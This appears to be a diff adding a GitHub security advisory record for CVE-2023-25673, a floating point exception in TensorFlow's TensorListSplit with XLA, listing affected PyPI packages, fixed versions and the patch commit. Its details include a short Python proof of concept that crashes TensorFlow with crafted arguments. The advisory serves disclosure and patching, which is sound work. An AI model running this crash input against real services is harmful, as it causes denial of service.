@@ -1,0 +1,103 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-647v-r7qq-24fh",
+  "modified": "2023-03-30T16:59:44Z",
+  "published": "2023-03-24T21:54:42Z",
+  "aliases": [
+    "CVE-2023-25673"
+  ],
+  "summary": "TensorFlow has Floating Point Exception in TensorListSplit with XLA ",
+  "details": "### Impact\nFPE in TensorListSplit with XLA \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.TensorListSplit\npara = {'tensor': [1], 'element_shape': -1, 'lengths': [0]}\n\n@tf.function(jit_compile=True)\ndef fuzz_jit():\n y = func(**para)\n return y\n\nprint(fuzz_jit())\n```\n\n### Patches\nWe have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow-cpu"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "tensorflow-gpu"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-647v-r7qq-24fh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25673"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tensorflow/tensorflow"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-697"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-24T21:54:42Z",
+    "nvd_published_at": "2023-03-25T00:15:00Z"
+  }
+}
